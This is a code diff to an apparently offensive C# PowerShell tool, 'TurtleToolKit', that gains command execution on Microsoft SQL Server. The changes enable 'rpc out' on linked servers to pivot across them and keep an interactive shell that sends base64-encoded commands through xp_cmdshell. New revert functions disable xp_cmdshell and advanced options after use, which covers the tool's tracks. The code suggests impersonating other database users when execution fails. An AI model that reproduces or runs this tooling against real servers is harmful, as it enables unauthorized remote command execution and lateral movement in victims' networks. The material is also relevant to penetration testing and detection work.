@@ -20,7 +20,7 @@ namespace TurtleToolKit
         [Parameter(Mandatory = false)] [Alias("u")] public string user { get; set; }
         [Parameter(Mandatory = false)] [Alias("p")] public string password { get; set; }
         [Parameter(Mandatory = false)] [Alias("ls")] public string linkServer { get; set; }
-        [Parameter(Mandatory = false)] [Alias("impersonate")] public string impersonateUser { get; set; }
+        [Parameter(Mandatory = false)] [Alias("i")] public string impersonateUser { get; set; }
 
 
 
@@ -49,7 +49,7 @@ namespace TurtleToolKit
             impUser = impersonateUser;
             if (!ExecuteSQLShell(sql, targetingLink))
             {
-                WriteWarning("Failed to execute shell...try using impersonation");
+                WriteWarning("Failed to execute shell...try using impersonation...Run Get-SQLInfo");
             }
             WriteVerbose("Success");
             sql.CloseDb();
@@ -85,8 +85,6 @@ namespace TurtleToolKit
                 return res;
             }
             // LINKED SERVER NEEDS AT QUERIES
-            Console.WriteLine("LINK");
-            Console.WriteLine(targetLink);
             // if not impersonating
             if (String.IsNullOrEmpty(impUser))
             {
@@ -103,8 +101,16 @@ namespace TurtleToolKit
         }
         public static bool LinkedShell(SQL sqlObj,string lnkSrv)
         {
+            Console.WriteLine("::: Attempting to enable rpc out :::");
+            string q = string.Format("EXEC sp_serveroption '{0}','rpc out','true';", lnkSrv);
+            if (!sqlObj.PerformQuery(q))
+            {
+                Console.WriteLine("Failed to enable rpc out");
+                Console.WriteLine("Run this again with -impersonateUser flag and specify a user you can impersonate");
+                return false;
+            }
             Console.WriteLine("::: Attempting to enable advanced Options :::");
-            string q = string.Format("EXEC ('sp_configure ''Show Advanced Options'',1; RECONFIGURE;') AT {0}", lnkSrv);
+            q = string.Format("EXEC ('sp_configure ''Show Advanced Options'',1; RECONFIGURE;') AT {0}", lnkSrv);
             if (!sqlObj.PerformQuery(q))
             {
                 Console.WriteLine("Failed to enable advanced options");
@@ -129,7 +135,7 @@ namespace TurtleToolKit
             Console.WriteLine("To exit type EXIT");
             while (true)
             {
-                Console.Write("PS turtle@{0}~$ ", sqlObj.targetServer);
+                Console.Write("PS turtle@{0}~$ ", lnkSrv);
                 string cmd = Console.ReadLine();
                 if (cmd == "EXIT") { break; }
                 string payload = Convert.ToBase64String(Encoding.Unicode.GetBytes(cmd));
@@ -140,6 +146,7 @@ namespace TurtleToolKit
                     Console.WriteLine("Failed to execute command");
                 }
             }
+            RevertSettingsLnk(sqlObj,lnkSrv);
             return true;
         }
         public static bool Shell(SQL sqlObj)
@@ -175,6 +182,38 @@ namespace TurtleToolKit
                 {
                     Console.WriteLine("Failed to execute command");
                 }
+            }
+            RevertSettings(sqlObj);
+            return true;
+        }
+        public static bool RevertSettings(SQL sqlObj)
+        {
+            if (!sqlObj.PerformQuery("sp_configure 'xp_cmdshell',0; RECONFIGURE;"))
+            {
+                Console.WriteLine("Failed to rever xp_cmdshell");
+                return false;
+            }
+            if (!sqlObj.PerformQuery("sp_configure 'Show Advanced Options',0; RECONFIGURE;"))
+            {
+                Console.WriteLine("Failed to revert advanced options");
+                return false;
+            }
+
+            return true;
+        }
+        public static bool RevertSettingsLnk(SQL sqlObj,string lnkSrv)
+        {
+            string q = string.Format("EXEC ('sp_configure ''xp_cmdshell'',0; RECONFIGURE;') AT {0}", lnkSrv);
+            if (!sqlObj.PerformQuery(q))
+            {
+                Console.WriteLine("Failed to revert xp_cmdshell");
+                return false;
+            }
+            q = string.Format("EXEC ('sp_configure ''Show Advanced Options'',0; RECONFIGURE;') AT {0}", lnkSrv);
+            if (!sqlObj.PerformQuery(q))
+            {
+                Console.WriteLine("Failed to revert advanced options");
+                return false;
             }
             return true;
         }
